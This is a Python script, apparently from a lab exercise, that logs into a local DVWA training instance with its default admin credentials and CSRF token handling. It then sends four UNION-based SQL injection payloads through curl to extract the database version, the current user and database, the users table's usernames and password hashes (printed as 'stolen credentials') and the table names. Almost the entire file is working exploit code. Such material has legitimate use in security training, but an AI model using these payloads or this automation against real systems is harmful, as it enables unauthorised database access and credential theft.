
import subprocess, re, html

# Step 1: Login to DVWA with CSRF token handling
print("=" * 60)
print("=== DVWA SQL Injection: Database Credential Theft ===")
print("=" * 60)

# GET login page to extract CSRF token
result = subprocess.run(
    ['curl', '-s', '-c', '/tmp/dvwa_cookies', '-b', '/tmp/dvwa_cookies',
     'http://localhost:28080/login.php'],
    capture_output=True, text=True
)
token_match = re.search(r"user_token'\s+value='([a-f0-9]+)'", result.stdout)
if not token_match:
    print("[-] Failed to extract CSRF token")
    exit(1)

token = token_match.group(1)
print(f"[+] CSRF Token: {token}")

# POST login with token
login_result = subprocess.run(
    ['curl', '-s', '-c', '/tmp/dvwa_cookies', '-b', '/tmp/dvwa_cookies',
     '-L', '-o', '/dev/null', '-w', '%{http_code}',
     '-d', f'username=admin&password=password&Login=Login&user_token={token}',
     'http://localhost:28080/login.php'],
    capture_output=True, text=True
)
print(f"[+] Login HTTP Status: {login_result.stdout}")

# Read cookies
with open('/tmp/dvwa_cookies', 'r') as f:
    cookies = f.read()
phpsessid = re.search(r'PHPSESSID\s+(\S+)', cookies)
session = phpsessid.group(1) if phpsessid else "unknown"
print(f"[+] Session: {session}")

# Step 2: SQL Injection - Extract database info
print("\n--- Attack 1: Extract Database Version ---")
sqli_version = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+1,@@version%23&Submit=Submit"],
    capture_output=True, text=True
)
# Extract from <pre> tags
pre_matches = re.findall(r'<pre>(.*?)</pre>', sqli_version.stdout, re.DOTALL)
for m in pre_matches:
    clean = html.unescape(re.sub(r'<[^>]+>', '', m)).strip()
    if clean and 'ID:' not in clean:
        print(f"  DB Version: {clean}")
        break
    elif 'ID:' in clean:
        parts = clean.split('\n')
        for p in parts:
            if not p.startswith('ID:'):
                print(f"  DB Version: {p.strip()}")

print("\n--- Attack 2: Extract Current User & Database ---")
sqli_user = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+current_user(),database()%23&Submit=Submit"],
    capture_output=True, text=True
)
pre_matches = re.findall(r'<pre>(.*?)</pre>', sqli_user.stdout, re.DOTALL)
for m in pre_matches:
    clean = html.unescape(re.sub(r'<[^>]+>', '', m)).strip()
    if 'ID:' in clean:
        parts = clean.split('\n')
        for p in parts:
            if not p.startswith('ID:'):
                print(f"  Current User / DB: {p.strip()}")

print("\n--- Attack 3: Dump ALL Users Table (Credentials) ---")
sqli_users = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user,password+FROM+users%23&Submit=Submit"],
    capture_output=True, text=True
)
pre_matches = re.findall(r'<pre>(.*?)</pre>', sqli_users.stdout, re.DOTALL)
print("\n  STOLEN CREDENTIALS:")
print("  " + "-" * 56)
print(f"  {'Username':<15} {'Password Hash':<40}")
print("  " + "-" * 56)
for m in pre_matches:
    clean = html.unescape(re.sub(r'<[^>]+>', '', m)).strip()
    lines = clean.split('\n')
    for line in lines:
        line = line.strip()
        if line and not line.startswith('ID:'):
            print(f"  {line}")

print("\n--- Attack 4: List All Tables in DVWA Database ---")
sqli_tables = subprocess.run(
    ['curl', '-s', '-b', f'PHPSESSID={session}; security=low',
     "http://localhost:28080/vulnerabilities/sqli/?id=1%27+UNION+SELECT+table_name,table_schema+FROM+information_schema.tables+WHERE+table_schema%3Ddatabase()%23&Submit=Submit"],
    capture_output=True, text=True
)
pre_matches = re.findall(r'<pre>(.*?)</pre>', sqli_tables.stdout, re.DOTALL)
print("\n  Tables in DVWA database:")
for m in pre_matches:
    clean = html.unescape(re.sub(r'<[^>]+>', '', m)).strip()
    lines = clean.split('\n')
    for line in lines:
        line = line.strip()
        if line and not line.startswith('ID:'):
            print(f"    - {line}")

print("\n" + "=" * 60)
print("  VERDICT: SQL Injection → Full Database Exfiltration")
print("=" * 60)

